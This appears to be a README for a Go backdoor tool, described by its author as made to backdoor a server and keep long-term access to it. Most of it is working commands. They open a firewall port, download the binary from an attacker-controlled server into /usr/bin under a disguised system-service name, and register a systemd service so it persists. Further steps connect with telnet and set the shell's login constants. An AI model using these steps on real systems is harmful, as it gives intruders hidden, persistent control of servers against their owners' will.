<h2>Golang Persistent Reverse Shell</h2>

<h3>Coded by T13R</h3>

<h4>This is made to backdoor a server and have long time access to it</h4>


<h1>Installation:</h1>

```sh
apt install snap snapd -y
snap install go --classic
```

<h1>Setup:</h1>

```sh
go build -o shell shell.go
```

<h3>Installing shell on infected device</h3><br>

```sh
iptables -A INPUT -p tcp --dport 9999 -j ACCEPT
iptables-save > /etc/iptables/rules.v4

url="http://YOUR_SERVER_IP/shell"

filename="/usr/bin/syslogbootc"
wget -O "$filename" "$url"
chmod +x "$filename"
service="[Unit]
Description=syslogbootc
After=network.target

[Service]
ExecStart=$filename -L /bin/bash

[Install]
WantedBy=multi-user.target"
rm -rf /etc/systemd/system/syslogbootc.service
echo "$service" > /etc/systemd/system/syslogbootc.service
systemctl enable --now syslogbootc.service
systemctl restart syslogbootc.service
```

<h3>Connect on your reverse shell</h3><br>

```sh
telnet INFECTED_SERVER_IP 9999
```

<h3>Change the login information on shell.go</h3><br>

```go
const (
	host       = "0.0.0.0"
	port       = "9999"
	username   = "admin"
	password   = "password"
	prompt     = "backdoor> "
	exitPrompt = "exit"
)
```

## Make sure you use a safe password for the reverse shell
